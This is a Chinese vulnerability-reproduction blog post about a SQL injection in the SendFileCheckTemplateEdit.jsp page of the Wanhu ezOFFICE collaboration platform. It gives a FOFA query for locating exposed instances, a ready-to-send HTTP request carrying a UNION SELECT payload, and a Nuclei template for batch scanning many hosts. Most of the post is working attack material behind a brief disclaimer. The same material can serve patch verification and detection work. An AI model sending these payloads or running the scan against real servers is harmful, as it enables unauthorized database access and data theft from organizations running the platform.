# 原创
：  漏洞复现--万户ezoffice FileCheckTemplateEdit SQL注入

# 漏洞复现--万户ezoffice FileCheckTemplateEdit SQL注入

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

万户ezOFFICE协同管理平台是一个综合信息基础应用平台。此系统SendFileCheckTemplateEdit.jsp存在SQL注入。

### 二：漏洞影响版本

万户ezoffice

### 三：网络空间测绘查询

fofa:<br/> `app="万户ezOFFICE协同管理平台"`

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/edef090fd0a784f6452f70494776ac67.jpeg"/><br/> poc：

```
GET /defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp?RecordID=1'%20UNION%20ALL%20SELECT%20@@version%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL-- HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/567d219d83c8786664bc73de3a53caf7.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/7605916fde1247629a11ed4aae020cf0.jpeg"/>

### 五：批量检测

```
id: wanhu-ezoffice-sql-inject
info:
  name: 万户ezOFFICE协同管理平台SendFileCheckTemplateEdit-SQL注入漏洞
  author: 芝士土拨鼠
  severity: high
  description: '万户ezOFFICE协同管理平台是一个综合信息基础应用平台。此系统SendFileCheckTemplateEdit.jsp存在SQL注入。'
  metadata:
    max-request: 3
    fofa-query: app="万户ezOFFICE协同管理平台"
    verified: true

http:
  - method: GET
    path:
      - "{{BaseURL}}/defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp?RecordID=1'%20UNION%20ALL%20SELECT%20@@version%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--"
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 &amp;&amp; contains(body,'SQL')"

```
